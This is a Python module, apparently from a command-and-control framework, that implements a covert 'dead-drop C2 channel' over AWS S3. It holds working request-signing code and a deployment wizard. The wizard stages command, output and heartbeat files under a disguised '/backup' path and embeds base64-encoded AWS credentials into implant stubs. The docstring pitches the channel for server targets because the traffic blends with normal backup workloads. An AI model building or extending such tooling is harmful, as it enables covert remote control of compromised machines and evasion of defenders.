"""
AWS S3 provider — transport + deployment wizard.

Dead-drop C2 channel via Amazon S3 with AWS Signature Version 4 authentication.
Recommended for Linux server targets — S3 traffic from a server is expected and
blends with standard backup/logging workloads.

Auth: AWS Sig V4 (HMAC-SHA256 key derivation, per-request signing — no SDK required)
API:  https://{bucket}.s3.{region}.amazonaws.com/{key}
"""
import base64
import hashlib
import hmac as _hmac_mod
import datetime
import re
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

import requests

from providers import _p, ask, ask_yn, err, info, ok, warn
from providers.base import (
    BaseConfig, BaseTransport, ProviderWizard, RateLimitedError, TRANSPORT_REGISTRY,
)

_HERE      = Path(__file__).parent
CREDS_FILE = Path("credentials") / "s3"

_EMPTY_HASH = hashlib.sha256(b"").hexdigest()


def _hmac256(key: bytes, msg: bytes) -> bytes:
    return _hmac_mod.new(key, msg, hashlib.sha256).digest()


def _hmac256h(key: bytes, msg: str) -> bytes:
    return _hmac256(key, msg.encode())


# ╔══════════════════════════════════════════════════════════════════════════════
# ║  S3 TRANSPORT  (runtime channel)
# ╚══════════════════════════════════════════════════════════════════════════════

class S3Transport(BaseTransport):
    """Dead-drop transport over AWS S3 with Sig V4 signing."""

    def __init__(self, creds: dict):
        self._access_key = creds.get("ACCESS_KEY_ID", "")
        self._secret_key = creds.get("SECRET_ACCESS_KEY", "")
        self._region     = creds.get("REGION", "us-east-1")
        self._bucket     = creds.get("BUCKET", "")
        self._host       = f"{self._bucket}.s3.{self._region}.amazonaws.com"
        self._endpoint   = f"https://{self._host}"

    def _signing_key(self, date_stamp: str) -> bytes:
        k_date    = _hmac256(f"AWS4{self._secret_key}".encode(), date_stamp.encode())
        k_region  = _hmac256h(k_date, self._region)
        k_service = _hmac256h(k_region, "s3")
        return _hmac256h(k_service, "aws4_request")

    def _sign(self, method: str, key: str, payload: bytes,
              content_type: Optional[str] = None,
              query_string: str = "", url_qs: str = ""):
        """Return (headers_dict, url) for a signed request.

        query_string: canonical query string for Sig V4 (e.g. "acl=" for sub-resources).
        url_qs: actual query string appended to the URL (e.g. "acl" — no "=").
                If omitted, query_string is used for the URL too.
        """
        now        = datetime.datetime.utcnow()
        amz_date   = now.strftime("%Y%m%dT%H%M%SZ")
        date_stamp = now.strftime("%Y%m%d")
        phash      = hashlib.sha256(payload).hexdigest()
        scope      = f"{date_stamp}/{self._region}/s3/aws4_request"
        url        = f"{self._endpoint}/{key}"
        _url_qs    = url_qs if url_qs else query_string
        if _url_qs:
            url = f"{url}?{_url_qs}"

        if content_type:
            signed_hdrs  = "content-type;host;x-amz-content-sha256;x-amz-date"
            canon_hdrs   = (
                f"content-type:{content_type}\n"
                f"host:{self._host}\n"
                f"x-amz-content-sha256:{phash}\n"
                f"x-amz-date:{amz_date}\n"
            )
        else:
            signed_hdrs  = "host;x-amz-content-sha256;x-amz-date"
            canon_hdrs   = (
                f"host:{self._host}\n"
                f"x-amz-content-sha256:{phash}\n"
                f"x-amz-date:{amz_date}\n"
            )

        canon_req = "\n".join([method, f"/{key}", query_string, canon_hdrs, signed_hdrs, phash])
        sts       = "\n".join([
            "AWS4-HMAC-SHA256", amz_date, scope,
            hashlib.sha256(canon_req.encode()).hexdigest(),
        ])
        sig  = _hmac256(self._signing_key(date_stamp), sts.encode()).hex()
        auth = (
            f"AWS4-HMAC-SHA256 Credential={self._access_key}/{scope},"
            f" SignedHeaders={signed_hdrs}, Signature={sig}"
        )

        hdrs = {
            "Authorization":         auth,
            "X-Amz-Date":            amz_date,
            "X-Amz-Content-Sha256":  phash,
        }
        if content_type:
            hdrs["Content-Type"] = content_type
        return hdrs, url

    def upload(self, path: str, data: bytes) -> bool:
        key = path.lstrip("/")
        hdrs, url = self._sign("PUT", key, data, "application/octet-stream")
        try:
            r = requests.put(url, headers=hdrs, data=data, timeout=30)
            return r.status_code in (200, 204)
        except Exception:
            return False

    def upload_verbose(self, path: str, data: bytes):
        """Return (ok, status_code, body) for diagnostic use."""
        key = path.lstrip("/")
        hdrs, url = self._sign("PUT", key, data, "application/octet-stream")
        try:
            r = requests.put(url, headers=hdrs, data=data, timeout=30)
            return r.status_code in (200, 204), r.status_code, r.text[:300]
        except Exception as e:
            return False, 0, f"{e} [url={url!r}]"

    def download(self, path: str) -> Optional[bytes]:
        key = path.lstrip("/")
        hdrs, url = self._sign("GET", key, b"")
        try:
            r = requests.get(url, headers=hdrs, timeout=30)
            if r.status_code == 429:
                raise RateLimitedError("S3 rate limited")
            if r.status_code == 200:
                return r.content
            return None
        except RateLimitedError:
            raise
        except Exception:
            return None

    def delete(self, path: str) -> bool:
        key = path.lstrip("/")
        hdrs, url = self._sign("DELETE", key, b"")
        try:
            r = requests.delete(url, headers=hdrs, timeout=30)
            return r.status_code in (200, 204, 404)
        except Exception:
            return False

    def delete_folder(self, folder_path: str) -> bool:
        """Delete all S3 objects under folder_path prefix (S3 has no real folders)."""
        prefix = folder_path.lstrip("/")
        if not prefix.endswith("/"):
            prefix += "/"
        # ListObjectsV2
        qs_canon = f"list-type=2&prefix={requests.utils.quote(prefix, safe='')}"
        qs_url   = f"list-type=2&prefix={requests.utils.quote(prefix, safe='')}"
        hdrs, url = self._sign("GET", "", b"", query_string=qs_canon, url_qs=qs_url)
        try:
            r = requests.get(url, headers=hdrs, timeout=30)
            if r.status_code != 200:
                return r.status_code == 404
            keys = re.findall(r"<Key>(.+?)</Key>", r.text)
        except Exception:
            return False
        for key in keys:
            self.delete(key)
        return True

    def is_public(self) -> Optional[bool]:
        """Return True if the bucket is publicly accessible, False if private, None on error.

        Tries GetBucketPolicyStatus first (most reliable). Falls back to GetBucketAcl
        if no bucket policy exists (NoSuchBucketPolicy → 404).

        AWS Sig V4 sub-resource canonical query string is "subresource=" (with empty value);
        the actual URL uses "?subresource" (no "="). _sign() handles this split via
        query_string (canonical form) vs url_qs (URL form).
        """
        # GetBucketPolicyStatus
        try:
            hdrs, url = self._sign("GET", "", b"",
                                   query_string="policyStatus=", url_qs="policyStatus")
            r = requests.get(url, headers=hdrs, timeout=15)
            if r.status_code == 200:
                m = re.search(r"<IsPublic>(true|false)</IsPublic>", r.text)
                if m:
                    return m.group(1) == "true"
            elif r.status_code not in (404, 403):
                return None
        except Exception:
            return None

        # Fallback: GetBucketAcl
        try:
            hdrs, url = self._sign("GET", "", b"",
                                   query_string="acl=", url_qs="acl")
            r = requests.get(url, headers=hdrs, timeout=15)
            if r.status_code == 200:
                pub_uris = (
                    "http://acs.amazonaws.com/groups/global/AllUsers",
                    "http://acs.amazonaws.com/groups/global/AuthenticatedUsers",
                )
                return any(uri in r.text for uri in pub_uris)
        except Exception:
            pass
        return None


TRANSPORT_REGISTRY["s3"] = S3Transport


# ============================================================
# S3 CONFIG
# ============================================================

@dataclass
class S3Config(BaseConfig):
    """BaseConfig + AWS S3 credentials."""
    access_key_id:     str = ""
    secret_access_key: str = ""
    region:            str = "us-east-1"
    bucket:            str = ""

    def save_creds(self) -> None:
        CREDS_FILE.parent.mkdir(parents=True, exist_ok=True)
        CREDS_FILE.write_text(
            "# AWS S3 Configuration\n"
            f"# Generated: {datetime.datetime.now().strftime('%a %b %d %I:%M:%S %p %Z %Y')}\n\n"
            f'ACCESS_KEY_ID="{self.access_key_id}"\n'
            f'SECRET_ACCESS_KEY="{self.secret_access_key}"\n'
            f'REGION="{self.region}"\n'
            f'BUCKET="{self.bucket}"\n'
        )
        CREDS_FILE.chmod(0o600)

    def load_creds(self) -> bool:
        if not CREDS_FILE.exists():
            return False
        for line in CREDS_FILE.read_text().splitlines():
            m = re.match(r'^(\w+)=["\']?(.*?)["\']?\s*$', line.strip())
            if m:
                k, v = m.group(1), m.group(2).strip()
                if k == "ACCESS_KEY_ID":     self.access_key_id     = v
                if k == "SECRET_ACCESS_KEY": self.secret_access_key = v
                if k == "REGION":            self.region            = v
                if k == "BUCKET":            self.bucket            = v
        return bool(self.access_key_id and self.secret_access_key and self.bucket)


# ============================================================
# S3 WIZARD
# ============================================================

class S3Wizard(ProviderWizard):
    PROVIDER_ID   = "s3"
    PROVIDER_NAME = "AWS S3"
    PROVIDER_ICON = "🪣"
    TRANSPORT_DIR = _HERE / "transport"

    def _creds_path(self, deploy_dir: Path) -> Path:
        return deploy_dir / f".{self.PROVIDER_ID}_creds"

    def make_config(self) -> S3Config:
        cfg = S3Config()
        cfg.folder_path    = "/backup"
        cfg.input_file     = "/cmd.bin"
        cfg.output_file    = "/out.bin"
        cfg.heartbeat_file = "/hb.bin"
        return cfg

    def step_auth(self, cfg: S3Config) -> None:
        self._step("AWS S3 Credentials")

        if CREDS_FILE.exists():
            ans = ask(f"Found existing credentials ({CREDS_FILE}). Reuse? [Y/n]")
            if not ans or ans.lower().startswith("y"):
                if cfg.load_creds():
                    ok(f"AWS credentials loaded from {CREDS_FILE}")
                    return
                warn(f"Saved credentials incomplete (missing BUCKET?) — re-entering")

        _p([("", "")])
        _p([("class:yellow", "  Create an IAM user with S3 access:")])
        info("1. AWS Console → IAM → Users → Create user")
        info("2. Attach policy: AmazonS3FullAccess  (or a scoped inline policy)")
        info("3. Security credentials tab → Create access key → Application running outside AWS")
        info("4. Download the CSV or note ACCESS_KEY_ID and SECRET_ACCESS_KEY")
        _p([("", "")])
        _p([("class:yellow", "  S3 bucket (create beforehand if not existing):")])
        info("   aws s3 mb s3://<bucket-name> --region <region>")
        info("   Disable public access; enable versioning optional")
        info("   Enter the full bucket name exactly as shown in the AWS console")
        info("   e.g. 'my-bucket-eu-west-1' — not just 'my-bucket'")
        _p([("", "")])

        import re as _re
        cfg.access_key_id     = ask("ACCESS_KEY_ID")
        cfg.secret_access_key = ask("SECRET_ACCESS_KEY")
        cfg.region            = ask("REGION", cfg.region)
        cfg.bucket            = ask("BUCKET  (full name, e.g. my-bucket-eu-west-1)")
        if not cfg.access_key_id or not cfg.secret_access_key or not cfg.bucket:
            err("ACCESS_KEY_ID, SECRET_ACCESS_KEY and BUCKET are required")
        # MED-11: validate S3 bucket name (RFC 3986 / S3 naming rules)
        if cfg.bucket and not _re.match(r'^[a-z0-9][a-z0-9.\-]{1,61}[a-z0-9]$', cfg.bucket):
            err(f"BUCKET name invalid (must be 3-63 lowercase alphanumeric/hyphen/dot): {cfg.bucket!r}")

        info("Verifying bucket access...")
        t = S3Transport({
            "ACCESS_KEY_ID":     cfg.access_key_id,
            "SECRET_ACCESS_KEY": cfg.secret_access_key,
            "REGION":            cfg.region,
            "BUCKET":            cfg.bucket,
        })
        probe = t.upload("/.stratum_probe", b"ok")
        if probe:
            t.delete("/.stratum_probe")
            ok("Bucket write/delete access confirmed")
        else:
            warn("Bucket probe failed — check credentials and bucket policy")

        public = t.is_public()
        if public is True:
            warn("OPSEC WARNING: bucket is publicly accessible — anyone can read dead-drop files")
            warn("  Fix: S3 Console → Block Public Access → Enable all four settings")
        elif public is False:
            ok("Bucket public access: PRIVATE")
        else:
            warn("Could not verify bucket public-access status — confirm manually in S3 Console")

        cfg.save_creds()
        ok("Credentials saved (reusable for future deployments)")

    def step_init_channel(self, cfg: S3Config) -> None:
        self._step("S3 Object Initialization")
        t = self._make_transport(cfg)
        for dest, body in [
            (cfg.folder_path + cfg.input_file,     b"MZ"),
            (cfg.folder_path + cfg.output_file,    b"MZ"),
            (cfg.folder_path + cfg.heartbeat_file, b"MZ"),
        ]:
            success, status, body_resp = t.upload_verbose(dest, body)
            if success:
                ok(f"{dest} → initialized")
            else:
                warn(f"{dest} — upload failed [HTTP {status}]: {body_resp}")

    def _provider_subs(self, cfg: S3Config) -> dict:
        b64 = lambda s: base64.b64encode(s.encode()).decode()
        return {
            "PLACEHOLDER_ACCESS_KEY_ID_B64":     b64(cfg.access_key_id),
            "PLACEHOLDER_SECRET_ACCESS_KEY_B64": b64(cfg.secret_access_key),
            "PLACEHOLDER_S3_REGION_B64":         b64(cfg.region),
            "PLACEHOLDER_S3_BUCKET_B64":         b64(cfg.bucket),
            "STUB_ACCESS_KEY_ID_B64":            b64(cfg.access_key_id),
            "STUB_SECRET_ACCESS_KEY_B64":        b64(cfg.secret_access_key),
            "STUB_S3_REGION_B64":                b64(cfg.region),
            "STUB_S3_BUCKET_B64":                b64(cfg.bucket),
        }

    def _native_agent_extra_env(self, cfg: S3Config) -> dict:
        return {
            "STRATUM_ACCESS_KEY_ID":     cfg.access_key_id,
            "STRATUM_SECRET_ACCESS_KEY": cfg.secret_access_key,
            "STRATUM_S3_REGION":         cfg.region,
            "STRATUM_S3_BUCKET":         cfg.bucket,
            "STRATUM_PROVIDER":          "s3",
        }

    def _make_transport(self, cfg: S3Config) -> S3Transport:
        return S3Transport({
            "ACCESS_KEY_ID":     cfg.access_key_id,
            "SECRET_ACCESS_KEY": cfg.secret_access_key,
            "REGION":            cfg.region,
            "BUCKET":            cfg.bucket,
        })
